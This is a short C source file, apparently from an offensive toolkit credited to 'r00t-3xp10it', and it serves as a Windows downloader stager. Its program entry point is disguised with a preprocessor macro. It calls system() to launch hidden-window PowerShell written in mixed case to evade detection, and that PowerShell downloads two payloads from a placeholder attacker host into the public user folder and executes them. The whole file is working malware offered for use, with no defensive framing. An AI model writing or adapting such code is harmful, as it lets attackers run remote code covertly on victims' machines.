/*
Author: pedro ubuntu [ r00t-3xp10it ]
Credits: mascerano [ exe execution ]
Credits: null byte [ Method POC ]
*/

#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<windows.h>

#define _____(i,s,o,g,r,a,m)(i##r##s##o)
#define _ _____(m,i,n,u,a,l,s)

int _()
{
 system("PoWeRsHeLl -wIN 1 -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://LhOsT/ScRee', 'C:\\Users\\Public\\ScRee') & sTaRt C:\\Users\\Public\\ScRee & pOwErShElL -wIN 1 -C (NeW-oBjEcT nEt.WeBClIeNt).dOwNlOaDfIlE('http://LhOsT/payload.EhLh', 'C:\\Users\\Public\\payload.EhLh') & StArT C:\\Users\\Public\\payload.EhLh");
  return 0;
}

